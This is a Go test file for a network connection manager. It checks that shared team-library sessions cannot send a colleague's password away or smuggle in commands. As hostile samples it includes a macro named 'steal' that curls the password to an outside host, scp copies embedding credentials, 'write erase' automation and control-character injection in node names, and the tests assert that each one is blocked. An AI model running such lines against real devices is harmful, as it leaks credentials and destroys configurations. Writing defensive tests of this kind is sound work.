// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 The YACM Authors. Additional terms under GPLv3 section 7: see NOTICE.md.

package core

import (
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/icavar/yacm/internal/store"
)

func TestTeamCommandsNeverSendThePassword(t *testing.T) {
	for _, s := range []string{"show run", "  <USER> ", "copy running-config tftp://<HOST>/<NAME>.cfg"} {
		if !teamCommandOK(s) {
			t.Errorf("refused %q", s)
		}
	}
	for _, s := range []string{"<PASS>", "enable\n<PASS>", "copy running-config scp://ivan@198.51.100.7/x\n\n\n\n<PASS>",
		"copy running-config scp://<USER>:<PASS>@198.51.100.7/x", "echo <USER>"} {
		if teamCommandOK(s) {
			t.Errorf("allowed %q", s)
		}
	}
}

func TestTeamRulesAnswerOnlyLoginPrompts(t *testing.T) {
	r := func(expect, send string) store.ExpectRule {
		return store.ExpectRule{Active: true, Expect: expect, Send: send, Return: true}
	}
	noEnter := func(expect, send string) store.ExpectRule {
		return store.ExpectRule{Active: true, Expect: expect, Send: send}
	}
	cases := []struct {
		name  string
		rules []store.ExpectRule
		want  []bool
	}{
		{"login", []store.ExpectRule{r("Username:", "<USER>"), r("Password:", "<PASS>"), r("#", "terminal length 0")}, []bool{true, true, true}},
		{"ogin", []store.ExpectRule{r("ogin:", "<USER>"), r("word:", "<PASS>")}, []bool{true, true}},
		{"enable", []store.ExpectRule{r("Password:", "<PASS>"), r(">", "enable"), r("Password:", "<PASS>")}, []bool{true, true, true}},
		{"device asks", []store.ExpectRule{r("#", "telnet 198.51.100.7"), r("Username:", "<USER>"), r("Password:", "<PASS>")}, []bool{true, false, false}},
		{"copy then answer", []store.ExpectRule{r("#", "copy running-config scp://ivan@198.51.100.7/x"), r("]?", ""), r("Password:", "<PASS>")}, []bool{true, true, false}},
		{"multi-line send", []store.ExpectRule{r("#", "show clock\n<PASS>")}, []bool{false}},
		{"two tokens", []store.ExpectRule{r("Password:", "<PASS>\n<USER>")}, []bool{false}},
		{"pattern matches the CLI", []store.ExpectRule{r("#|word", "<PASS>")}, []bool{false}},
		{"optional hint", []store.ExpectRule{r("(?:pass)?#", "<PASS>")}, []bool{false}},
		{"send at once", []store.ExpectRule{r("", "<PASS>")}, []bool{false}},
		{"at the prompt", []store.ExpectRule{r("#", "<PASS>"), r(">", "<USER>")}, []bool{false, false}},
		{"typed without Enter, then Ctrl-A", []store.ExpectRule{noEnter("(?:pass)?core-r1#", "<PASS>"), r("", "\x01copy running-config tftp://198.51.100.7/")}, []bool{false, false}},
		{"password without Enter", []store.ExpectRule{noEnter("Password:", "<PASS>")}, []bool{false}},
		{"hostname with a hint", []store.ExpectRule{r("pinsk-r1#", "<PASS>")}, []bool{false}},
		{"regex ending in a colon", []store.ExpectRule{r("(?:pass)?.*:", "<PASS>")}, []bool{false}},
		{"shell prompt", []store.ExpectRule{r("user@pinsk:", "<PASS>")}, []bool{false}},
		{"history recall", []store.ExpectRule{r("Password:", "<PASS>"), r("#", "\x10")}, []bool{true, false}},
		{"OpenSSH prompt", []store.ExpectRule{r("'s password: ", "<PASS>")}, []bool{true}},
		// The form of YACM's own presets and the demo.
		{"preset login", []store.ExpectRule{r("[Uu]sername:\\s*$", "<USER>"), r("[Pp]assword:\\s*$", "<PASS>")}, []bool{true, true}},
		{"preset enable", []store.ExpectRule{r(">\\s*$", "enable"), r("[Pp]assword:\\s*$", "<PASS>"), r("#\\s*$", "terminal length 0")}, []bool{true, true, true}},
		{"preset form at the CLI", []store.ExpectRule{r("[Pp]assword#\\s*$", "<PASS>"), r("[Rr]1>\\s*$", "<USER>")}, []bool{false, false}},
		{"anchor in the middle", []store.ExpectRule{r("$|[Pp]assword:\\s*$", "<PASS>")}, []bool{false}},
		{"other regex", []store.ExpectRule{r(".*password:\\s*$", "<PASS>"), r("(?i)password:", "<PASS>")}, []bool{false, false}},
		{"plain text with brackets", []store.ExpectRule{r("Router (lab) password:", "<PASS>")}, []bool{true}},
	}
	for _, c := range cases {
		got := teamRulesOK(c.rules)
		for i := range got {
			if got[i] != c.want[i] {
				t.Errorf("%s: rule %d = %v, want %v", c.name, i, got[i], c.want[i])
			}
		}
	}
}

// A copy of a library session in your own sessions keeps the same limits.
func TestTeamCopyKeepsTheLimits(t *testing.T) {
	ss := &store.Session{
		Expect: []store.ExpectRule{
			{Active: true, Expect: "#", Send: "telnet 198.51.100.7"},
			{Active: true, Expect: "Password:", Send: "<PASS>"},
		},
		Macros: []store.Macro{{Text: "show version"}, {Text: "copy run scp://x@evil/y\n<PASS>"}},
	}
	if n := sanitizeTeamCopy(ss); n != 2 || !ss.Expect[0].Active || ss.Expect[1].Active || len(ss.Macros) != 1 {
		t.Fatalf("copy not cleaned (%d): %+v", n, ss)
	}
}

// A library publisher cannot make a colleague's session send the
// colleague's login to their server through automation or saved commands.
func TestTeamLibraryCannotSendLoginsAway(t *testing.T) {
	libPath := filepath.Join(t.TempDir(), "noc.json")
	pub := newTestApp(t)
	noc, _ := pub.store.Upsert(&store.Node{Name: "NOC", IsGroup: true})
	pub.store.Upsert(&store.Node{Name: "core-r1", ParentID: noc.ID, Session: &store.Session{Protocol: store.ProtoSSH, Host: "10.0.0.1", Port: 22,
		Expect: []store.ExpectRule{
			{ID: "a", Active: true, Expect: "assword:", Send: "<PASS>", Return: true},
			{ID: "b", Active: true, Expect: "#", Send: "copy running-config scp://<USER>:<PASS>@198.51.100.7/x", Return: true},
			{ID: "c", Active: true, Expect: "#", Send: "<PASS>", Return: true},
		},
		Macros: []store.Macro{{Name: "steal", Text: "curl https://198.51.100.7/?p=<PASS>"}, {Name: "fine", Text: "show version"}},
	}})
	if _, err := pub.PublishTeamLibrary(PublishRequest{GroupID: noc.ID, Path: libPath}); err != nil {
		t.Fatal(err)
	}
	fol := newTestApp(t)
	if _, err := fol.AddTeamLibrary(libPath); err != nil {
		t.Fatal(err)
	}
	var logged []string
	fol.emitter = func(name string, data any) {
		if name == "tab:log" {
			logged = append(logged, data.(map[string]string)["text"])
		}
	}
	node := findNode(fol, "core-r1")
	if node == nil || node.Library == "" {
		t.Fatalf("library session not found: %+v", node)
	}
	fol.vault.Set("test/pass", "colleagues-secret")
	tb := &tab{id: "t1", node: node, eff: &store.Effective{User: "colleague", PasswordKey: "test/pass"}}
	rules := fol.buildRules(tb)
	if len(rules) != 1 || rules[0].Label != "assword:" {
		t.Fatalf("rules from the library = %+v", rules)
	}
	if len(logged) != 2 {
		t.Fatalf("skipped rules not reported: %q", logged)
	}
	fol.tabsMu.Lock()
	fol.tabs["t1"] = tb
	fol.tabsMu.Unlock()
	if err := fol.SendMacro("t1", 0); err == nil || !strings.Contains(err.Error(), "team library") {
		t.Fatalf("library macro with <PASS> in a command: %v", err)
	}
	if err := fol.SendText([]string{"t1"}, "copy run scp://x@y/z\n<PASS>", true, true); err == nil {
		t.Fatal("team command with <PASS> inside was sent")
	}
	// The same text from your own library is yours to send.
	if err := fol.SendText([]string{"t1"}, "copy run scp://<USER>:<PASS>@x/y", true, false); err == nil || strings.Contains(err.Error(), "team library") {
		t.Fatalf("own command refused for the wrong reason: %v", err)
	}
}

// A change to the automation of a team session is asked about like a new
// address; records from older versions only compare the address once.
func TestTeamTargetNoticesAutomation(t *testing.T) {
	n := &store.Node{ID: "x", Name: "r1", Session: &store.Session{Protocol: store.ProtoSSH, Host: "10.0.0.1", Port: 22}}
	before := targetOf(n, nil)
	n.Session.Expect = []store.ExpectRule{{ID: "r", Active: true, Expect: "#", Send: "write erase", Return: true}}
	after := targetOf(n, nil)
	if before.equal(after) || !strings.Contains(after.String(), "automation") {
		t.Fatalf("automation change not noticed: %s / %s", before, after)
	}
	n.Session.Proxy = &store.Proxy{Type: "http", Host: "198.51.100.7", Port: 3128}
	n.Session.AgentForward = true
	p := targetOf(n, nil)
	if p.equal(after) || !strings.Contains(p.String(), "proxy http 198.51.100.7:3128") || !strings.Contains(p.String(), "agent forwarding") {
		t.Fatalf("proxy or agent change not noticed: %s", p)
	}
	old := teamTarget{Protocol: "ssh", Host: "10.0.0.1", Port: 22}
	if !old.equal(p) {
		t.Fatal("a record from an older version should only compare the address")
	}
	s := &teamSeen{}
	s.set("x", old)
	s.set("x", p)
	if got, _ := s.get("x"); got.V != teamTargetV {
		t.Fatalf("old record not rewritten: %+v", got)
	}
}

// The anti-idle text runs at the device prompt by itself: a change to it in
// a library is asked about like a change of automation.
func TestTeamTargetNoticesAntiIdle(t *testing.T) {
	n := &store.Node{ID: "x", Name: "r1", Session: &store.Session{Protocol: store.ProtoSSH, Host: "10.0.0.1", Port: 22, AntiIdle: 60, AntiIdleText: "!"}}
	before := targetOf(n, nil)
	n.Session.AntiIdleText = "write erase{enter}"
	if before.equal(targetOf(n, nil)) {
		t.Fatal("anti-idle change not noticed")
	}
	// Saved commands go only when picked: no question for them.
	n.Session.AntiIdleText = "!"
	n.Session.Macros = []store.Macro{{Text: "show version"}}
	if !before.equal(targetOf(n, nil)) {
		t.Fatal("a saved command alone should not ask again")
	}
}

// Tokens cannot bring control characters into library rules, waits are
// capped, and login answers wait for a quiet prompt at the end.
func TestTeamRulesAtRunTime(t *testing.T) {
	libPath := filepath.Join(t.TempDir(), "noc.json")
	pub := newTestApp(t)
	noc, _ := pub.store.Upsert(&store.Node{Name: "NOC", IsGroup: true})
	pub.store.Upsert(&store.Node{Name: "core-r1", ParentID: noc.ID, Session: &store.Session{Protocol: store.ProtoSSH, Host: "10.0.0.1", Port: 22,
		Expect: []store.ExpectRule{
			{ID: "a", Active: true, Expect: "Password:", Send: "<PASS>", Return: true, Timeout: 86400},
			{ID: "b", Active: true, Expect: "#", Send: "show <NAME>", Return: true},
		},
	}})
	if _, err := pub.PublishTeamLibrary(PublishRequest{GroupID: noc.ID, Path: libPath}); err != nil {
		t.Fatal(err)
	}
	fol := newTestApp(t)
	if _, err := fol.AddTeamLibrary(libPath); err != nil {
		t.Fatal(err)
	}
	node := findNode(fol, "core-r1")
	if got := fol.buildRules(&tab{id: "t0", node: node}); len(got) != 0 {
		t.Fatalf("with no password to send the automation must stop: %+v", got)
	}
	// A login rule that may fail is only skipped when there is nothing to send.
	own := &store.Node{ID: "own", Name: "r2", Session: &store.Session{Protocol: store.ProtoTelnet, Host: "10.0.0.2", Port: 23, Expect: []store.ExpectRule{
		{ID: "u", Active: true, Expect: "[Uu]sername:\\s*$", Send: "<USER>", Return: true, OnFail: "continue"},
		{ID: "p", Active: true, Expect: "[Pp]assword:\\s*$", Send: "<PASS>", Return: true},
		{ID: "t", Active: true, Expect: "#\\s*$", Send: "terminal length 0", Return: true},
	}}}
	fol.vault.Set("test/line", "line-secret")
	if got := fol.buildRules(&tab{id: "t3", node: own, eff: &store.Effective{PasswordKey: "test/line"}}); len(got) != 2 || got[0].Send != "line-secret" {
		t.Fatalf("rules without a user name = %+v", got)
	}
	fol.vault.Set("test/pass", "colleagues-secret")
	eff := &store.Effective{User: "colleague", PasswordKey: "test/pass"}
	rules := fol.buildRules(&tab{id: "t1", node: node, eff: eff})
	if len(rules) != 2 || rules[0].Timeout != teamRuleTimeout*time.Second || rules[0].Quiet != teamLoginQuiet || rules[1].Quiet != 0 {
		t.Fatalf("rules = %+v", rules)
	}
	if rules[0].Pattern.MatchString("Password: was changed\r\nrouter#") || !rules[0].Pattern.MatchString("\r\nPassword: ") {
		t.Fatal("the login prompt must end the output")
	}
	// The preset form waits for the same plain text, in either case.
	pre := teamLoginPattern("[Pp]assword:\\s*$")
	if !pre.MatchString("\r\nPassword: ") || !pre.MatchString("password:") || pre.MatchString("Password: was changed\r\nrouter#") || pre.MatchString("Password: x") {
		t.Fatalf("preset pattern %s", pre)
	}
	// A name with control characters is refused, so <NAME> cannot bring them.
	if err := store.Validate(&store.Node{Name: "r1\x10\x01copy run tftp://x/", Session: &store.Session{Protocol: store.ProtoSSH, Host: "10.0.0.1"}}); err == nil {
		t.Fatal("a name with control characters was accepted")
	}
	evil := *node
	evil.Name = "r1\x01copy"
	if got := fol.buildRules(&tab{id: "t2", node: &evil, eff: eff}); len(got) != 1 {
		t.Fatalf("a rule resolving to control characters was kept: %+v", got)
	}
}
